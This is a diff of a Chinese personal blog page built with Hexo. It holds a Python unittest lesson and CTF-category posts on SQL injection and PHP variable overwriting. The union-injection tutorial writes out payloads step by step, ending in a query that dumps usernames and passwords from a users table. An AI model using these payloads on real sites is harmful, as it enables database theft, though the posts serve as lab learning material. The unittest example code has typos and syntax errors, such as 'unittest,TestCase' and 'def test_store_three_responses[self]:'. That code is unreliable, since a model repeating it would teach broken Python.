self.assertIn(<span class="string">&#x27;English&#x27;</span>,my_survey.responses)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_three_responses</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;测试三个答案&quot;&quot;&quot;</span></span><br><span class="line">        question = <span class="string">&quot;What language did you first learn to speak?&quot;</span></span><br><span class="line">        my_survey = AnonymousSurvey(qusetion)</span><br><span class="line">        response = [<span class="string">&#x27;English&#x27;</span>,<span class="string">&#x27;Spanish&#x27;</span>,<span class="string">&#x27;Mandarin&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> responses:</span><br><span class="line">            my_survey.store_response(response)</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> responses:</span><br><span class="line">            self.assertIn(response,my_survey.responses)</span><br><span class="line"></span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure>
-<ul>
-<li>方法setUp()
-unittest.TestCase类包含方法setUp(),让我们只需创建这些对象一次，并在每个测试方法中使用它们。如果你在TestCase类中包含了方法setUp(),Python将先运行它，再运行各个以test_打头的方法。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> survy <span class="keyword">import</span> AnonymousSurvy</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestAnonymousSurvey</span>(unittest,TestCase):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;针对AnonymousSurvey类的测试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUp</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建一个调查对象和一组答案，供使用的测试方法使用&quot;&quot;&quot;</span></span><br><span class="line">        question = <span class="string">&quot;What language did you first learn to speak?&quot;</span></span><br><span class="line">        self.my_survey = AnonymousSurvey(question)</span><br><span class="line">        self.responses = [<span class="string">&#x27;English&#x27;</span>,<span class="string">&#x27;Spanish&#x27;</span>,<span class="string">&#x27;Mandarin&#x27;</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_single_response</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;测试单个答案会妥善地存储&quot;&quot;&quot;</span></span><br><span class="line">        self.my_survey.store_response(self.responses[<span class="number">0</span>])</span><br><span class="line">        self.assertIn(self.responses[<span class="number">0</span>],self.my_survey.responses)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_three_responses</span>[self]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;测试三个答案会被妥善地存储&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            self.my_survey.store_response(response)</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            self.assertIn(response,self.my_survey.responses)</span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/05/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/05/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/" class="post-title-link" itemprop="url">SQL注入之联合查询</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-05 14:35:42" itemprop="dateCreated datePublished" datetime="2022-11-05T14:35:42+08:00">2022-11-05</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:33:11" itemprop="dateModified" datetime="2023-04-23T17:33:11+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="联合查询union注入">联合查询(union注入)</h1>
-<p>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化
-## 1. 页面观察</p>
-<p>当我们输入id=1和id=2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了</p>
-<h2 id="注入点判断">2. 注入点判断</h2>
-<p>开始判断是否存在注入，输入?id=1'，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞</p>
-<p>继续判断</p>
-<p><code>?id=1' and 1=1 --+</code> 页面正常显示</p>
-<p><code>?id=1' and 1=2 --+</code>
-页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号</p>
-<h2 id="判断当前表的字段个数">3. 判断当前表的字段个数</h2>
-<p><code>?id=1 order by 3 --+</code><br />
-<code>?id=1 order by 4 --+</code>
-,此时显示未知的列，说明此时当前表中只有3列</p>
-<h2 id="判断显示位">4. 判断显示位</h2>
-<p>上面我们判断出来了表中有3列，接下来判断我们的输入会在屏幕哪个地方进行回显<br />
-<code>?id=-1' union select 1,2,3 --+</code><br />
-让union select前面的参数查不出来，所以id=-1'</p>
-<p>如下，在name和password中回显了我们的输入，这时我们就随便选一个地方来放置接下来的测试语句。</p>
-<h2 id="爆数据库名字">5. 爆数据库名字</h2>
-<p><code>?id=-1' union select 1,database(),3 --+</code></p>
-<h2 id="爆数据库中的表">6. 爆数据库中的表</h2>
-<p><code>?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code>
-其中爆出来数据库中存在三个表</p>
-<h2 id="爆表中的字段">7. 爆表中的字段</h2>
-<p>我们这里选择一个表，users进行进一步的获取表中的字段值<br />
-<code>?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+</code><br />
-获取到三个字段，分别为id,username,password</p>
-<h2 id="爆相应字段的所有数据">8. 爆相应字段的所有数据</h2>
-<p><code>?id=-1' union select 1,group_concat(id,'--',username,'--',password),3 from users --+</code><br />
-至此，一次完整的脱库过程结束了，联合查询也就结束了。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
-  </nav>
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="竹云"
-      src="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-  <p class="site-author-name" itemprop="name">竹云</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">22</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">5</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">15</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2023</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">竹云</span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
-  </div>
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-</body>
-</html>
+利用select count(),floor(rand(0)2)x from
+information_schema.character_sets group by
+x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)2)函数，实现将注入结果与报错信息回显的注入方式。
+ rand()函数
+rand()可以产生一个在0和1之间的随机数
+直接使用rand函数每次产生的数值不一样，但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，这也可以称之为伪随机。
+* floor (rand(0)2)函数
+floor函数的作用就是返回小于等于括号内该值的最大整数。
+rand()本身是返回0~1的随机数，但在后面2就变成了返回0~2之间的随机数。
+配合上floor函数就可以产生确定的两个数 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2022/11/12/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" title="PHP变量覆盖">PHP变量覆盖</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-11-12T12:35:50.000Z" title="发表于 2022-11-12 20:35:50">2022-11-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">漏洞原理
+变量覆盖是指可以用自己的传参代替原有的变量值
+漏洞寻找
+例如下面的函数或语法使用不当时就会出现漏洞 * $$ * extract() *
+parse_str() * import_request_variables() * mb_parse_str *
+register_globals
+漏洞解析
+extract()
+原理 &gt; extract()函数从数组中将变量导入到当前的符号表。
+123456789&lt;?php$a = &#x27;nsilab&#x27;;$my_array = (&quot;a&quot;=&gt;&quot;C&quot;,&quot;b&quot;=&gt;&quot;T&quot;,&quot;c&quot;=&gt;&quot;F&quot;);extarct($my_array);echo &quot;\$a = $a; \$b = $b; \$c = $c;&quot;?&gt;  输出：$a = C; $b = T; $c = F
+攻击手段
+12345678910&lt;?php$a=&quot;echo & ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2022/11/12/%E6%95%A3%E8%A3%85Python%E9%80%9F%E6%88%90/" title="散装Python速成">散装Python速成</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-11-12T08:51:05.000Z" title="发表于 2022-11-12 16:51:05">2022-11-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Python/">Python</a></span></div><div class="content">本文(侧重于类、文件和异常)配合《Python编程：从入门到实践》食用效果更佳QAQ
+变量
+字符串大小写：
+
+title()
+upper()
+lower()
+
+12name = &quot;ada lovelace&quot;print(name.title())
+合并字符串 1234first_name = &quot;ada&quot;last_name = &quot;lovelace&quot;full_name = first_name + &quot; &quot; + last_nameprint(full_name)
+删除空白：
+
+rstrip()
+lstrip()
+strip()
+
+str()
+123age = 23message = &quot;Happy &quot; + str(age) +&quot;rd Birthday!&quot;print(message)
+列表
+12bicycles = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;,&#x ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2022/11/05/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/" title="SQL注入之联合查询">SQL注入之联合查询</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-11-05T06:35:42.000Z" title="发表于 2022-11-05 14:35:42">2022-11-05</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">联合查询(union注入)
+联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化
+## 1. 页面观察
+当我们输入id=1和id=2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了
+2. 注入点判断
+开始判断是否存在注入，输入?id=1'，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞
+继续判断
+?id=1' and 1=1 --+ 页面正常显示
+?id=1' and 1=2 --+
+页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号
+3. 判断当前表的字段个数
+?id=1 order by 3 --+
+?id=1 order by 4 --+
+,此时显示未知的列，说明此时当前表中只有3列
+4. 判断显示位
+上面我们判断出来了表中有3列，接下来判断我们的输入会在屏幕哪个地方进行回显
+?id=-1' union select 1,2,3 --+
+让union select前面的参数查不出来，所以id=-1'
+如 ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#content-inner">3</a><a class="extend next" rel="next" href="/page/3/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">竹云</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/22/JavaWeb/" title="JavaWeb">JavaWeb</a><time datetime="2023-08-22T12:46:55.000Z" title="发表于 2023-08-22 20:46:55">2023-08-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/21/MoeCTF/" title="MoeCTF">MoeCTF</a><time datetime="2023-08-21T10:34:28.000Z" title="发表于 2023-08-21 18:34:28">2023-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/07/XXE/" title="XXE">XXE</a><time datetime="2023-08-07T13:49:05.000Z" title="发表于 2023-08-07 21:49:05">2023-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="phar反序列化">phar反序列化</a><time datetime="2023-07-28T07:36:26.000Z" title="发表于 2023-07-28 15:36:26">2023-07-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/28/pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="pear文件包含">pear文件包含</a><time datetime="2023-07-28T07:30:47.000Z" title="发表于 2023-07-28 15:30:47">2023-07-28</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/"><span class="card-category-list-name">CTF</span><span class="card-category-list-count">15</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/MISC/"><span class="card-category-list-name">MISC</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Python/"><span class="card-category-list-name">Python</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/network/"><span class="card-category-list-name">network</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%BC%80%E5%8F%91/"><span class="card-category-list-name">开发</span><span class="card-category-list-count">1</span></a></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 1.3em; color: #99a1ac">文件包含</a> <a href="/tags/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/" style="font-size: 1.1em; color: #999">字符编码</a> <a href="/tags/XXE/" style="font-size: 1.1em; color: #999">XXE</a> <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size: 1.1em; color: #999">正则表达式</a> <a href="/tags/python%E8%84%9A%E6%9C%AC/" style="font-size: 1.1em; color: #999">python脚本</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 1.1em; color: #999">命令执行</a> <a href="/tags/WP/" style="font-size: 1.1em; color: #999">WP</a> <a href="/tags/HTTP%E5%8D%8F%E8%AE%AE/" style="font-size: 1.1em; color: #999">HTTP协议</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.1em; color: #999">文件上传</a> <a href="/tags/LaTeX/" style="font-size: 1.1em; color: #999">LaTeX</a> <a href="/tags/CMS/" style="font-size: 1.1em; color: #999">CMS</a> <a href="/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" style="font-size: 1.1em; color: #999">变量覆盖</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.5em; color: #99a9bf">SQL注入</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.3em; color: #99a1ac">反序列化</a> <a href="/tags/Java/" style="font-size: 1.1em; color: #999">Java</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/01/"><span class="card-archive-list-date">一月 2023</span><span class="card-archive-list-count">4</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/11/"><span class="card-archive-list-date">十一月 2022</span><span class="card-archive-list-count">9</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/10/"><span class="card-archive-list-date">十月 2022</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">22</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-08-22T13:29:03.987Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 竹云</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
